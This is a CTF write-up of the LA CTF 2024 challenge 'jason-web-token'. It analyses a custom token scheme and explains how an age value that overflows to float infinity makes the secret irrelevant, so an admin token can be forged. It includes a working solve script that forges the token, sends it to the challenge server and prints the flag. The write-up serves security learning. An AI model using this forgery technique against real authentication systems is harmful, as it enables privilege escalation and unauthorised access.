# jason-web-token

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @f0o_f0o
- Contributor: @siunam, @obeidat., @yassinebelarbi, @colonneil
- 62 solves / 471 points
- Author: r2uwu2
- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

With all this hype around jwt, I decided to implement jason web tokens to secure my OWN jason fan club site. Too bad its not in haskell. [jwt.chall.lac.tf](https://jwt.chall.lac.tf)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219214538.png)

## Enumeration

**Index page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219214823.png)

In here, we can enter username and age to get the "JASON" (JSON) Web Token (JWT):

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219215008.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219215025.png)

When we click the button "Get JASON", it'll send a POST request to `/login` with JSON data `{"username":"<username>","age":<age>}`. In the response, it sets a new cookie named `token`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219215035.png)

Then, it'll also send a GET request to `/img` with our `token` cookie.

Hmm... Not much we can do in here, let's dive into this web application's source code.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/web/jason-web-token/jwt.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/jason-web-token)-[2024.02.19|21:53:44(HKT)]
└> file jwt.zip                                    
jwt.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/jason-web-token)-[2024.02.19|21:53:45(HKT)]
└> unzip jwt.zip        
Archive:  jwt.zip
  inflating: app.py                  
  inflating: auth.py                 
  inflating: Dockerfile              
  inflating: index.html              
   creating: static/
  inflating: static/index.css        
  inflating: static/aplet.png        
  inflating: static/index.js         
  inflating: static/bplet.png        
```

After reading through the source code, we have the following findings:

**`app.py`, GET method route `/img`:**
```python
from pathlib import Path
[...]
import auth
[...]
@app.get("/img")
def img(resp: Response, token: str | None = Cookie(default=None)):
    userinfo, err = auth.decode_token(token)
    if err:
        resp.status_code = 400
        return {"err": err}
    if userinfo["role"] == "admin":
        return {"msg": f"Your flag is {flag}", "img": "/static/bplet.png"}
    return {"msg": "Enjoy this jason for your web token", "img": "/static/aplet.png"}
[...]
```

In here, it first **decodes the token**. Then, if our `role` is `admin`, we can get the flag.

So, our goal is to **escalate our `role` to `admin`**.

**`app.py`, POST method route `/login`:**
```python
[...]
from fastapi import Cookie, FastAPI, Response
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

import auth
[...]
class LoginForm(BaseModel):
    username: str
    age: int


@app.post("/login")
def login(login: LoginForm, resp: Response):
    age = login.age
    username = login.username

    if age < 10:
        resp.status_code = 400
        return {"msg": "too young! go enjoy life!"}
    if 18 <= age <= 22:
        resp.status_code = 400
        return {"msg": "too many college hackers, no hacking pls uwu"}

    is_admin = username == auth.admin.username and age == auth.admin.age
    token = auth.create_token(
        username=username,
        age=age,
        role=("admin" if is_admin else "user")
    )

    resp.set_cookie("token", token)
    resp.status_code = 200
    return {"msg": "login successful"}
[...]
```

When we submit the form, it checks our JSON data's `age` is less than `10` and between `18` and `22`. If we're old enough, we can proceed.

Then, it checks our username and age is the same as the admin one. If we're not matching, it'll **create a new token** with our `role` set to `user`.

Hmm... Looks like the `auth` module plays a big part in this challenge. Let's head over there.

**`auth.py`:**
```python
import hashlib
import json
import os
import time

secret = int.from_bytes(os.urandom(128), "big")
hash_ = lambda a: hashlib.sha256(a.encode()).hexdigest()


class admin:
    username = os.environ.get("ADMIN", "admin-owo")
    age = int(os.environ.get("ADMINAGE", "30"))


def create_token(**userinfo):
    userinfo["timestamp"] = int(time.time())
    salted_secret = (secret ^ userinfo["timestamp"]) + userinfo["age"]
    data = json.dumps(userinfo)
    return data.encode().hex() + "." + hash_(f"{data}:{salted_secret}")


def decode_token(token):
    if not token:
        return None, "invalid token: please log in"

    datahex, signature = token.split(".")
    data = bytes.fromhex(datahex).decode()
    userinfo = json.loads(data)
    salted_secret = (secret ^ userinfo["timestamp"]) + userinfo["age"]

    if hash_(f"{data}:{salted_secret}") != signature:
        return None, "invalid token: signature did not match data"
    return userinfo, None
```

As you can see, this is the custom implementation of the JWT (JSON Web Token). Let's break it down!

In the `admin` class, on the remote instance, the `username` and `age` attribute are **retrieved from the environment variables**. If we're running this web application locally, the username is `admin-owo` and age is `30`.

**As for the token creation, it's this:**
```python
import hashlib
import json
import os
import time

secret = int.from_bytes(os.urandom(128), "big")
hash_ = lambda a: hashlib.sha256(a.encode()).hexdigest()
[...]
def create_token(**userinfo):
    userinfo["timestamp"] = int(time.time())
    salted_secret = (secret ^ userinfo["timestamp"]) + userinfo["age"]
    data = json.dumps(userinfo)
    return data.encode().hex() + "." + hash_(f"{data}:{salted_secret}")
[...]
```

In here, we can see that the **timestamp** is the **current epoch** (Unix time), the **`secret`** is generated with a **random 128-byte and convert that to integer**, and the **`age`** is our submitted **JSON data's `age`**.

After that, it calculates a `salted_secret` via $(S \oplus T) + A$, where $S$ = `secret`, $T$ = `timestamp`, $A$ = `age`.

> Note: $\oplus$ means XOR logic operator.

Then, it converts our `userinfo` dictionary object into raw JSON data.

Finally, it returns the JWT. Unlike the real JWT, **it only contains 2 parts: `payload` and `signature`**, where the delimiter character is a full stop character (`.`).

In the payload, the raw JSON data is converted into hexadecimal.

In the signature, is **calculated by SHA-256'ing our raw JSON data and the `salted_secret`**. Here's the hashing data example:

```
<raw_JSON_data>:<salted_secret>

{"username": "foobar", "age": 123, "role": "user", "timestamp": 1708352232}:87581613465294435178517642974248673816502397055378723721284904678613317502300398352766044269005553120484577624531265948828240022420975819764485371663417572892688509681945029251830790319702677590834820899196631130233348257773374774805724104464395106585228146289340788294121393298111629224333024561255491253337
```

Which then calculated to `486ad4cf466e04f1fc5f65a9b6240522e6457e3a1939581a16aaaacd7858a9b8`.

**Hence, our expected JWT is like this:**
```
<hexed_JSON_data_payload>.<sha256_signature>

7b22757365726e616d65223a2022666f6f626172222c2022616765223a203132332c2022726f6c65223a202275736572222c202274696d657374616d70223a20313730383335323233327d.486ad4cf466e04f1fc5f65a9b6240522e6457e3a1939581a16aaaacd7858a9b8
```

**Hmm... How about the token decoding?**
```python
[...]
def decode_token(token):
    if not token:
        return None, "invalid token: please log in"

    datahex, signature = token.split(".")
    data = bytes.fromhex(datahex).decode()
    userinfo = json.loads(data)
    salted_secret = (secret ^ userinfo["timestamp"]) + userinfo["age"]

    if hash_(f"{data}:{salted_secret}") != signature:
        return None, "invalid token: signature did not match data"
    return userinfo, None
[...]
```

As expected, it first split the JWT into 2 parts: payload and signature. Then in the payload, it convert the hexed JSON data back to `userinfo` dictionary object. After that, the `salted_secret` calculation is the same as the token creation.

What's difference is **it checks the integrity of the `signature`**. If the data has been modified, changed `salted_secret` doesn't match up to the original one.

Turns out, **the `salted_secret` calculation method is flawed**!

In mathematic, when we, human, dealing with decimal number, it's trivial to calculate some value up to x significant figures. However, computers and programs are not. For them, they're using something call "**floating point arithmetic**".

**In Python, floating point is like this:**
```python
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/penguin-login)-[2024.02.19|23:05:20(HKT)]
└> python3
[...]
>>> 0.1 + 0.2
0.30000000000000004
```

> Note: For more details about floating point arithmetic, you can watch [this YouTube video by Computerphile](https://www.youtube.com/watch?v=PZRI1IfStY0). (I'm suck at doing math, let alone with explaining it XD)

Now, I wonder **what is the maximum floating point number in Python**. To answer this, we can use the `sys` module:

```python
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/penguin-login)-[2024.02.19|23:05:20(HKT)]
└> python3
[...]
>>> __import__('sys').float_info.max
1.7976931348623157e+308
```

Woah, what's that `e+308` stuff?

In scientific notation for floating point numbers, the `e+x` means "10 to raised to the positive $x$ power".

So, in the above floating point number, it's basically means: $1.7976931348623157 * 10^{308}$

Hmm... Now what if we exceed that maximum floating point number? Like `1.8e+308`, or $1.8 * 10^{308}$

```python
>>> 1.8e+308
inf
>>> type(1.8e+308)
<class 'float'>
```

What? `inf`?

When we exceeded the maximum floating point number, **it'll just return `inf`, which means "infinity"**.

Now, **if the age is infinity, how the `salted_secret` will be calculated**?

```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/jason-web-token)-[2024.02.20|13:27:51(HKT)]
└> python3
[...]
>>> import hashlib
>>> import json
>>> import os
>>> import time
>>> 
>>> secret = int.from_bytes(os.urandom(128), "big")
>>> hash_ = lambda a: hashlib.sha256(a.encode()).hexdigest()
>>> 
>>> timestamp = 1708409176
>>> age = 1.8e+308
>>> salted_secret = (secret ^ timestamp) + age
>>> salted_secret
inf
```

Oh! The `salted_secret` will become `inf`!

That being said, we can forge our token `role` claim to `admin`, **because the `secret` is no longer useful**!

## Exploitation

Armed with above information, we can try to put all the pieces of the puzzle back together.

**Test script:**
```python
import hashlib
import json
import os
import time

class JasonWebToken:
    def __init__(self, userinfo):
        self.userinfo = userinfo
        # self.secret = int.from_bytes(os.urandom(128), 'big')
        # hardcode the secret
        self.secret = 9141234535239612542115732646415394834739740025058524373858457143378589177031148816534120294714141112505806096907002630659689671621116085375889852960305769858424552001372865055125407914147834757052620537572773021594229118857174315271635420782593133647009117231906050286162348069043105546850219307788889710878
        self.hash_ = lambda a: hashlib.sha256(a.encode()).hexdigest()

    def createToken(self):
        self.userinfo['timestamp'] = int(time.time())
        saltedSecret = (self.secret ^ self.userinfo['timestamp']) + self.userinfo['age']
        data = json.dumps(self.userinfo)
        signature = self.hash_(f'{data}:{saltedSecret}')

        print(f'[*] Secret: {self.secret}')
        print(f'[*] Salted secret: {saltedSecret}')
        print(f'[*] Signature: {signature}')
        print(f'[*] Raw JSON data: {data}')

        hexedData = data.encode().hex()
        token = f'{hexedData}.{signature}'
        return token

    def decodeToken(self, token):
        datahex, signature = token.split('.')
        data = bytes.fromhex(datahex).decode()
        userinfo = json.loads(data)
        saltedSecret = (self.secret ^ userinfo['timestamp']) + userinfo['age']

        newSignature = self.hash_(f'{data}:{saltedSecret}')

        print(f'[*] User info: {userinfo}')
        print(f'[*] Signature from user\'s token: {signature}')
        print(f'[*] New signature: {newSignature}')

        isMatchSignature = True if newSignature == signature else False
        if not isMatchSignature:
            print('[-] Invalid token: signature did not match data')
            return

        print('[+] The token\'s signature is matched to the new one!')

if __name__ == '__main__':
    userinfo = {
        'username': 'foobar',
        'age': 123,
        'role': 'user'
    }
    jwt = JasonWebToken(userinfo)

    print('[*] Generating new token...')
    token = jwt.createToken()
    print(f'[+] Token: {token}\n')

    print('[*] Decoding the token...')
    jwt.decodeToken(token)
```

**Generate a new token and decode it:**
```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/jason-web-token)-[2024.02.20|14:04:08(HKT)]
└> python3 jwt_signature_generator.py
[*] Generating new token...
[*] Secret: 9141234535239612542115732646415394834739740025058524373858457143378589177031148816534120294714141112505806096907002630659689671621116085375889852960305769858424552001372865055125407914147834757052620537572773021594229118857174315271635420782593133647009117231906050286162348069043105546850219307788889710878
[*] Salted secret: 9141234535239612542115732646415394834739740025058524373858457143378589177031148816534120294714141112505806096907002630659689671621116085375889852960305769858424552001372865055125407914147834757052620537572773021594229118857174315271635420782593133647009117231906050286162348069043105546850219307790547230913
[*] Signature: 56d713d62b6d973fc28d88ba1c391961c93d45892867a5dd1c816fce5ec75d45
[*] Raw JSON data: {"username": "foobar", "age": 123, "role": "user", "timestamp": 1708409176}
[+] Token: 7b22757365726e616d65223a2022666f6f626172222c2022616765223a203132332c2022726f6c65223a202275736572222c202274696d657374616d70223a20313730383430393137367d.56d713d62b6d973fc28d88ba1c391961c93d45892867a5dd1c816fce5ec75d45

[*] Decoding the token...
[*] User info: {'username': 'foobar', 'age': 123, 'role': 'user', 'timestamp': 1708409176}
[*] Signature from user's token: 56d713d62b6d973fc28d88ba1c391961c93d45892867a5dd1c816fce5ec75d45
[*] New signature: 56d713d62b6d973fc28d88ba1c391961c93d45892867a5dd1c816fce5ec75d45
[+] The token's signature is matched to the new one!
```

**Now, we modify something in the JSON data, and try to decode it:**
```python
if __name__ == '__main__':
    userinfo = {
        'username': 'foobar',
        'age': 123,
        'role': 'user'
    }
    jwt = JasonWebToken(userinfo)

    # print('[*] Generating new token...')
    # token = jwt.createToken()
    # print(f'[+] Token: {token}\n')
    userinfo = {
        'username': 'blah',
        'age': 123,
        'role': 'admin',
        'timestamp': 1708409176
    }
    hexedData = json.dumps(userinfo).encode().hex()
    token = f'{hexedData}.56d713d62b6d973fc28d88ba1c391961c93d45892867a5dd1c816fce5ec75d45'

    print('[*] Decoding the token...')
    jwt.decodeToken(token)
```

> Note: Assume the `secret` is not known, we can't recalculate the signature again.

```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/jason-web-token)-[2024.02.20|14:14:13(HKT)]
└> python3 jwt_signature_generator.py
[*] Decoding the token...
[*] User info: {'username': 'blah', 'age': 123, 'role': 'admin', 'timestamp': 1708409176}
[*] Signature from user's token: 56d713d62b6d973fc28d88ba1c391961c93d45892867a5dd1c816fce5ec75d45
[*] New signature: b000309eda3e9f9580de535a387b351aa217cc31249d452741234ad858eb3358
[-] Invalid token: signature did not match data
```

As expected, the token's signature doesn't match to the new one.

**But what if, change the `age` to `1.8e+308`?** Since the `salted_secret` will always become `inf`, we can **recalculate the signature**!

```python
if __name__ == '__main__':
    userinfo = {
        'username': 'foobar',
        'age': 123,
        'role': 'user'
    }
    jwt = JasonWebToken(userinfo)

    # print('[*] Generating new token...')
    # token = jwt.createToken()
    # print(f'[+] Token: {token}\n')
    userinfo = {
        'username': 'blah',
        'age': 1.8e+308,
        'role': 'admin',
        'timestamp': 1708409176
    }
    saltedSecret = float('inf')
    data = json.dumps(userinfo)
    newSignature = jwt.hash_(f'{data}:{saltedSecret}')

    hexedData = data.encode().hex()
    token = f'{hexedData}.{newSignature}'

    print('[*] Decoding the token...')
    jwt.decodeToken(token)
```

```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/jason-web-token)-[2024.02.20|14:31:34(HKT)]
└> python3 jwt_signature_generator.py
[*] Decoding the token...
[*] User info: {'username': 'blah', 'age': inf, 'role': 'admin', 'timestamp': 1708409176}
[*] Signature from user's token: 243650229dd5a5726b747bc153d14271dee5425e358be5c94b74182667bfa6bb
[*] New signature: 243650229dd5a5726b747bc153d14271dee5425e358be5c94b74182667bfa6bb
[+] The token's signature is matched to the new one!
```

As you can see, our forged token's signature is now matched to the new one!!

**With that said, let's modify our test script into a solve script:**
```python
import hashlib
import json
import time
import requests
import re

class JasonWebToken:
    def __init__(self, baseUrl):
        self.DECODE_TOKEN_ROUTE = '/img'
        self.FLAG_REGEX_FORMAT = r'(lactf\{.*\})'

        self.USERNAME = 'givemeflag'
        self.AGE = 1.8e+308
        self.ROLE = 'admin'
        self.TIMESTAMP = int(time.time())
        self.userinfo = {'username': self.USERNAME, 'age': self.AGE, 'role': self.ROLE, 'timestamp': self.TIMESTAMP}

        self.baseUrl = baseUrl
        self.hash_ = lambda a: hashlib.sha256(a.encode()).hexdigest()

    def createForgedToken(self):
        saltedSecret = float('inf')
        data = json.dumps(self.userinfo)
        signature = self.hash_(f'{data}:{saltedSecret}')

        print(f'[*] Salted secret: {saltedSecret}')
        print(f'[*] Signature: {signature}')
        print(f'[*] Raw JSON data: {data}')

        hexedData = data.encode().hex()
        token = f'{hexedData}.{signature}'
        return token

    def sendGetFlagRequest(self, token):
        header = {
            'Cookie': f'token={token}'
        }
        response = requests.get(f'{self.baseUrl}{self.DECODE_TOKEN_ROUTE}', headers=header)
        responseMsg = response.json()['msg'].strip()

        matchedFlag = re.search(self.FLAG_REGEX_FORMAT, responseMsg)
        if not matchedFlag:
            return None

        flag = matchedFlag.group(1)
        return flag

    def exploit(self):
        print('[*] Generating new forged token...')
        token = self.createForgedToken()
        print(f'[+] Token: {token}\n')

        flag = self.sendGetFlagRequest(token)
        if not flag:
            print(f'[-] The token didn\'t get forged...')

        print(f'[+] The token has been forged! Here\'s the flag:\n{flag}')

if __name__ == '__main__':
    baseUrl = 'https://jwt.chall.lac.tf'
    jwt = JasonWebToken(baseUrl)
    jwt.exploit()
```

```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/jason-web-token)-[2024.02.20|14:45:51(HKT)]
└> python3 jwt_signature_generator.py
[*] Generating new forged token...
[*] Salted secret: inf
[*] Signature: 7c9f68b0bcb85fe6a85984e709fd84429754ea771c6e3c0af28c2f13702dfd36
[*] Raw JSON data: {"username": "givemeflag", "age": Infinity, "role": "admin", "timestamp": 1708411618}
[+] Token: 7b22757365726e616d65223a2022676976656d65666c6167222c2022616765223a20496e66696e6974792c2022726f6c65223a202261646d696e222c202274696d657374616d70223a20313730383431313631387d.7c9f68b0bcb85fe6a85984e709fd84429754ea771c6e3c0af28c2f13702dfd36

[+] The token has been forged! Here's the flag:
lactf{pr3v3nt3d_th3_d0s_bu7_47_wh3_c0st}
```

- **Flag: `lactf{pr3v3nt3d_th3_d0s_bu7_47_wh3_c0st}`**

## Conclusion

What we've learned:

1. Floating point confusion